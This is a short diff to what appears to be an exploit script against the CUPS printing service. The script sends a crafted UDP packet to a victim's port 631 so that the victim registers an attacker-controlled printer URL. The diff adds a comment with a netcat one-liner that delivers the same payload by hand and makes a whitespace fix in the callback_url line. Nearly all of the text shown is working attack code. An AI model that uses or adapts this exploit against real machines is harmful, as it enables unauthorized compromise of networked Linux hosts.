@@ -160,6 +160,9 @@ sleep(1)
 def send_udp_packet(ip, port, message):
     print("sending")
 
+    # manually send the packet
+    # echo 0 0 http://192.168.122.1:8000/printers/whatever | nc -u victim 631
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(message.encode('utf-8'), (ip, port))
     sock.close()
@@ -178,7 +181,7 @@ if IMPERSONATE_PRINTER:
     #     use `info` to create a diff printer b/c it affects name
     #
     # callback_url = f"FF 10 {attacker_http_printer} \"your_mom\"\"barinfo\""
-    callback_url = f"0 0 {attacker_http_printer}" # simplest:
+    callback_url = f"0 0 {attacker_http_printer}"  # simplest:
 
     send_udp_packet(victim_ip, victim_port, callback_url)
     print("sent")
